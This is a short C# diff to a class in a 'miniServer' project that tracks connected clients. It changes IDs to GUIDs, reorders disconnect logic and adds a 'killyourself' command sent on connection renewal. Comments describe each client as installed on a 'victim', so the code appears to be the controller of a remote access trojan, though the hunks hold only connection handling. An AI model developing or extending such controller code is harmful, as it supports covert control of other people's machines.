@@ -11,7 +11,7 @@ namespace miniServer
         /// <summary>
         /// Unique ID of client
         /// </summary>
-        public int ID { get; }
+        public Guid ID { get; }
         public TcpClient client { get; private set; }
         public string IP { get; }
         public string Port { get; }
@@ -32,7 +32,7 @@ namespace miniServer
         /// <param name="_client">Client connection object</param>
         /// <param name="_os">OS name and version</param>
         /// <param name="_version">Version of client that installed on victim</param>
-        public miniClient(int _id, TcpClient _client, string _os, string clientVersion, string hostName = null)
+        public miniClient(Guid _id, TcpClient _client, string _os, string clientVersion, string hostName = null)
         {
             ID = _id;
             client = _client;
@@ -98,6 +98,8 @@ namespace miniServer
                                 SendToClient("IamAlive");
                             else
                                 Recivedata += incomming;
+                            
+                            
                         }
                     }
                 }
@@ -105,7 +107,9 @@ namespace miniServer
             catch (Exception x)
             { Recivedata += x.Message; }
             finally
-            { clientStream.Close(); }
+            {
+                clientStream.Close();
+            }
         }
 
         /// <summary>
@@ -113,16 +117,21 @@ namespace miniServer
         /// </summary>
         public void Disconnect()
         {
-            thread.Abort();
             client.Close();
+            IsAlive = false;
+            thread.Abort();
         }
         /// <summary>
         /// Stop old listen, close connection, clear recive data, change tcp client and crypto key, start new listen
         /// </summary>
         /// <param name="newTcpClient">New tcp client</param>
         /// <param name="newKey">New AES key</param>
-        public void RenewConnection(TcpClient newTcpClient, string newKey)
+        public void RenewConnection(TcpClient newTcpClient,bool Kill)
         {
+            if (Kill)
+            {
+                this.SendToClient("killyourself");
+            }
             Disconnect();
             client = newTcpClient;
             Recivedata = "";
